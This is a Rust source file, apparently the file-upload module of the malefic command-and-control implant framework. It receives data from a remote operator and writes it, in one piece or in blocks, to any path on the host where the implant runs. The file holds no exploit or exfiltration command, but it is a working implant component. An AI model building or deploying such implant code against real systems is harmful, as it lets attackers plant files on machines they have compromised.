// #[allow(non_snake_case)]
use crate::{check_field, check_request, Module, Result, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;

use async_trait::async_trait;
use malefic_trait::module_impl;
use std::fs::OpenOptions;
use std::io::Write;

pub struct Upload {}

#[async_trait]
#[module_impl("upload")]
impl Module for Upload {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::UploadRequest)?;

        let target = check_field!(request.target)?;

        let mut file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(target)?;

        if request.data.is_empty() {
            // data为空，不执行任何操作或进行特定处理
        } else {
            file.write_all(&request.data)?;
            return Ok(TaskResult::new_with_ack(id, 0));
        }
        let _ = sender.send(TaskResult::new_with_ack(id, 0)).await?;
        loop {
            let block = check_request!(receiver, Body::Block)?;
            let _ = file.write_all(&block.content)?;

            if block.end {
                return Ok(TaskResult::new_with_ack(id, block.block_id));
            } else {
                let _ = sender
                    .send(TaskResult::new_with_ack(id, block.block_id))
                    .await?;
            }
        }
    }
}
